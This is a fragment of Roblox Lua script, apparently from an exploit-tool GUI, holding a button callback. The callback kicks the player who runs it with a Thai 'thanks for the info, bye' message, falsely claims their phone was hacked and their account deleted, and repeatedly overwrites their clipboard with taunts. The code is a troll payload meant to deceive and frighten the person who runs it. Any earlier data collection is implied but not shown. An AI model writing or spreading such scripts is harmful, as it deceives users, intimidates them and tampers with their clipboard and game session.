    ...
    Buttons = {
        {
            ...
            Callback = function()
                ...
                task.wait(2)
                game:GetService("Players").LocalPlayer:Kick("ขอบคุณสำหรับข้อมูลนะจ๊ะบายยยยยยยยยย")
                setclipboard("Your phone got hacked by me  55555")
                task.wait(2)
                game:GetService("Players").LocalPlayer:Kick("Your account has Delete From Roblox For Exploit")
                setclipboard("HaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHaha")
                task.wait(0.1)
                setclipboard("HaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHahaHaHaHa")
                task.wait(0.2)
                setclipboard("hacked")
                task.wait(0.3)
